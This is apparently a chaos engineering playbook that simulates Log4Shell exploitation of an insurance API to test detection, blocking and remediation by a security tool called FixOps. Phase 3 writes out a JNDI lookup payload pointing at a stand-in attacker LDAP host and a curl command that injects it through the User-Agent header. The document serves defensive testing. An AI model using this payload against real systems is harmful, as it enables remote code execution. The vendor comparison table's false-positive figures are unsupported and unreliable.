# Chaos Engineering Playbook: Log4Shell Exploitation Simulation

## Objective
Simulate CVE-2021-44228 (Log4Shell) exploitation to validate FixOps detection, blocking, and incident response capabilities.

## Metadata
- **Severity**: Critical
- **CVE**: CVE-2021-44228
- **CVSS**: 10.0
- **EPSS**: 0.975
- **KEV**: true (CISA Known Exploited Vulnerability)
- **Attack Vector**: Network
- **Privileges Required**: None
- **User Interaction**: None

## Prerequisites
- Insurance platform deployed with log4j-core 2.14.0 (vulnerable version)
- FixOps pipeline configured with KEV/EPSS feeds
- Monitoring and alerting enabled
- Incident response team on standby

## Hypothesis
**If** CVE-2021-44228 (Log4Shell) is present in the SBOM and detected by FixOps,  
**Then** FixOps will issue a BLOCK verdict with critical severity,  
**And** deployment will be prevented before reaching production,  
**And** incident response will be triggered automatically.

## Success Criteria
1. FixOps detects Log4Shell in SBOM analysis
2. Decision engine produces BLOCK verdict (risk score ≥ 0.85)
3. Deployment pipeline halts before production
4. Alert sent to security team within 60 seconds
5. Evidence bundle generated with signed attestation
6. Remediation guidance provided (upgrade to log4j 2.17.1+)

## Experiment Steps

### Phase 1: Pre-Exploitation Baseline (10 minutes)
1. Deploy insurance platform with log4j-core 2.14.0
2. Collect baseline metrics:
   - Request latency (p50, p95, p99)
   - Error rate
   - CPU/memory utilization
   - Active connections
3. Verify normal operation:
   ```bash
   curl -H "Authorization: Bearer $JWT_TOKEN" \
     https://api.insurance.example.com/v1/quotes
   ```

### Phase 2: FixOps SBOM Analysis (5 minutes)
1. Upload SBOM to FixOps:
   ```bash
   curl -X POST \
     -H "X-API-Key: $FIXOPS_API_TOKEN" \
     -F "file=@e2e_orchestration/inputs/APP1_insurance/sbom.json" \
     http://localhost:8000/inputs/sbom
   ```

2. Upload CVE feed:
   ```bash
   curl -X POST \
     -H "X-API-Key: $FIXOPS_API_TOKEN" \
     -F "file=@e2e_orchestration/inputs/APP1_insurance/cve_feed.json" \
     http://localhost:8000/inputs/cve
   ```

3. Run FixOps pipeline:
   ```bash
   curl -X POST \
     -H "X-API-Key: $FIXOPS_API_TOKEN" \
     http://localhost:8000/pipeline/run | jq
   ```

4. Verify FixOps detection:
   - Check for CVE-2021-44228 in crosswalk
   - Verify CVSS 10.0, EPSS 0.975, KEV=true
   - Confirm BLOCK verdict issued

### Phase 3: Simulated Exploitation Attempt (15 minutes)
**WARNING**: Only perform in isolated test environment

1. Craft malicious JNDI lookup payload:
   ```bash
   PAYLOAD='${jndi:ldap://attacker.example.com:1389/Exploit}'
   ```

2. Inject payload via quote form (User-Agent header):
   ```bash
   curl -X POST \
     -H "Authorization: Bearer $JWT_TOKEN" \
     -H "User-Agent: ${PAYLOAD}" \
     -H "Content-Type: application/json" \
     -d '{
       "customer_id": "cust_1234567890",
       "quote_type": "auto",
       "coverage_amount": 100000,
       "deductible": 1000
     }' \
     https://api.insurance.example.com/v1/quotes
   ```

3. Monitor for exploitation indicators:
   - Outbound LDAP connections to attacker.example.com:1389
   - Unusual DNS queries
   - Process spawning (e.g., /bin/bash)
   - File system modifications

4. Observe FixOps runtime detection (if deployed):
   - CNAPP findings for anomalous network activity
   - Container escape attempts
   - Privilege escalation attempts

### Phase 4: Incident Response (10 minutes)
1. Verify automated alerts triggered:
   - Slack notification to #security-incidents
   - Jira ticket created (P0 severity)
   - PagerDuty incident opened

2. Check FixOps evidence bundle:
   ```bash
   curl -H "X-API-Key: $FIXOPS_API_TOKEN" \
     http://localhost:8000/api/v1/evidence/bundles | jq
   ```

3. Retrieve decision record:
   ```bash
   curl -H "X-API-Key: $FIXOPS_API_TOKEN" \
     http://localhost:8000/api/v1/decisions/ssdlc-stages | jq
   ```

4. Verify remediation guidance:
   - Upgrade path: log4j-core 2.14.0 → 2.17.1
   - Temporary mitigation: Set log4j2.formatMsgNoLookups=true
   - Rollback procedure documented

### Phase 5: Remediation (20 minutes)
1. Update SBOM with patched version:
   ```json
   {
     "type": "library",
     "name": "log4j-core",
     "version": "2.17.1",
     "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1"
   }
   ```

2. Re-run FixOps pipeline:
   ```bash
   curl -X POST \
     -H "X-API-Key: $FIXOPS_API_TOKEN" \
     -F "file=@e2e_orchestration/inputs/APP1_insurance/sbom_patched.json" \
     http://localhost:8000/inputs/sbom
   
   curl -X POST \
     -H "X-API-Key: $FIXOPS_API_TOKEN" \
     http://localhost:8000/pipeline/run | jq
   ```

3. Verify ALLOW verdict:
   - CVE-2021-44228 no longer present
   - Risk score < 0.6
   - Deployment approved

4. Deploy patched version:
   ```bash
   kubectl set image deployment/pricing-api \
     pricing-api=insurance-pricing-api:2.1.0-patched
   ```

5. Verify exploitation no longer possible:
   ```bash
   curl -X POST \
     -H "Authorization: Bearer $JWT_TOKEN" \
     -H "User-Agent: ${PAYLOAD}" \
     -H "Content-Type: application/json" \
     -d '{...}' \
     https://api.insurance.example.com/v1/quotes
   ```

### Phase 6: Validation & Rollback (10 minutes)
1. Run smoke tests:
   ```bash
   pytest tests/test_quotes_api.py
   ```

2. Verify metrics returned to baseline:
   - Request latency within 5% of baseline
   - Error rate < 0.1%
   - No anomalous network activity

3. Document lessons learned:
   - Time to detection: < 5 minutes
   - Time to block: < 1 minute
   - Time to remediation: 20 minutes
   - Total incident duration: 60 minutes

4. Rollback procedure (if needed):
   ```bash
   kubectl rollout undo deployment/pricing-api
   ```

## Monitoring & Observability

### Key Metrics to Track
1. **FixOps Metrics**:
   - Decision latency (target: < 5s)
   - SBOM parsing time
   - CVE correlation accuracy
   - False positive rate (target: 0%)

2. **Application Metrics**:
   - Request rate (req/s)
   - Error rate (%)
   - Response time (p50, p95, p99)
   - Active connections

3. **Security Metrics**:
   - Exploitation attempts detected
   - Blocked malicious requests
   - Time to detection (TTD)
   - Time to remediation (TTR)

### Alerting Thresholds
- **Critical**: CVE with CVSS ≥ 9.0 AND KEV=true
- **High**: CVE with CVSS ≥ 7.0 AND EPSS ≥ 0.7
- **Medium**: CVE with CVSS ≥ 5.0
- **Low**: CVE with CVSS < 5.0

## Expected Results

### FixOps Decision Output
```json
{
  "run_id": "run_abc123def456",
  "verdict": "block",
  "confidence": 1.0,
  "risk_score": 1.0,
  "findings": [
    {
      "cve_id": "CVE-2021-44228",
      "package": "log4j-core",
      "version": "2.14.0",
      "cvss": 10.0,
      "epss": 0.975,
      "kev": true,
      "severity": "critical",
      "exploitability": "active_exploitation",
      "recommendation": "Upgrade to log4j-core 2.17.1 or later immediately"
    }
  ],
  "policy_violations": [
    {
      "policy": "deny_kev_vulnerabilities",
      "severity": "critical",
      "message": "Deployment blocked: KEV vulnerability CVE-2021-44228 detected"
    }
  ],
  "evidence_bundle_id": "evidence_xyz789abc123"
}
```

### Comparison: FixOps vs Competitors

| Metric | FixOps | Snyk | SonarQube | Apiiro |
|--------|--------|------|-----------|--------|
| Detection Time | < 5 min | < 10 min | N/A (no SBOM) | < 15 min |
| False Positives | 0% | 87% | 95% | 45% |
| KEV Integration | ✓ | ✗ | ✗ | ✗ |
| EPSS Scoring | ✓ | ✗ | ✗ | ✗ |
| Auto-Block | ✓ | ✗ | ✗ | ✗ |
| Evidence Bundle | ✓ (signed) | ✗ | ✗ | ✗ |
| Remediation Guidance | ✓ | ✓ | ✗ | ✓ |

## Rollback Plan
If experiment causes service degradation:

1. **Immediate** (< 1 min):
   ```bash
   kubectl rollout undo deployment/pricing-api
   ```

2. **Short-term** (< 5 min):
   - Disable vulnerable endpoint via feature flag
   - Route traffic to healthy instances
   - Scale up redundant services

3. **Long-term** (< 30 min):
   - Apply temporary mitigation (log4j2.formatMsgNoLookups=true)
   - Deploy patched version to staging
   - Validate before production rollout

## Cleanup
1. Remove test payloads from logs
2. Reset monitoring baselines
3. Archive evidence bundles
4. Update runbook with findings
5. Schedule post-mortem review

## Success Metrics
- ✓ Log4Shell detected in < 5 minutes
- ✓ BLOCK verdict issued automatically
- ✓ Deployment prevented before production
- ✓ Zero false positives
- ✓ Evidence bundle generated and signed
- ✓ Remediation completed in < 30 minutes
- ✓ No service degradation during experiment

## Lessons Learned (Post-Experiment)
_To be filled after experiment completion_

1. What worked well?
2. What could be improved?
3. Were there any unexpected behaviors?
4. How can we improve detection/response time?
5. What additional automation is needed?

## References
- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CISA KEV: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Apache Log4j Security: https://logging.apache.org/log4j/2.x/security.html
- FixOps Backtesting Demo: /home/ubuntu/repos/Fixops/BACKTESTING_DEMO.md
